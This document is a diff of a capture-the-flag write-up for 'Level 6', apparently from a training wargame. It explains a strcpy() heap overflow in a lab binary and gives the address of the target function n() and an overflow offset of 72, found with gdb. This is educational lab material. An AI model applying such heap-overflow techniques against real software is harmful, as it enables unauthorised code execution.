@@ -1,17 +1,11 @@
-# Level 6
+# Level6
 
-https://perso.liris.cnrs.fr/lionel.brunie/documents/notes-correction-attaque-buffer-overflow.pdf
-
-## 1. Identity
+## 1. Context
 
 ```bash
 $ id
 uid=2064(level6) gid=2064(level6) groups=2064(level6),100(users)
-```
 
-## 2. Home directory
-
-```bash
 $ pwd
 /home/user/level6
 
@@ -21,10 +15,9 @@ $ ls -la
 [...]
 ```
 
-## 3. Analyzing the file
+## 2. Program behavior
 
 Testing it :
-
 ```bash
 ./level6 
 Segmentation fault (core dumped)
@@ -32,7 +25,22 @@ Segmentation fault (core dumped)
 Nope
 ```
 
-Let's test our code with a huge input :
+Expects an argument.
+
+## 3. Code overview
+
+The `main()` function mallocs a string and then uses `strcpy()` to this str without checking the size.
+We can use a **heap overflow**.
+The `m()` function uses `puts` to print a message (Nope).
+The unused `n()` function prints our password (level8).
+
+## 4. Exploit
+
+Let's use a heap overflow to modify `m()` and call `n()`.
+
+The address of `n()` is : "\x54\x84\x04\x08".
+
+Testing our code with a huge input :
 ```bash
 $ gdb level6
 
@@ -48,7 +56,6 @@ eip            0x53535353       0x53535353
 53 = S => offset = 72
 
 The offset of the overflow is 72
-
 
 ## 4. Getting the flag
 
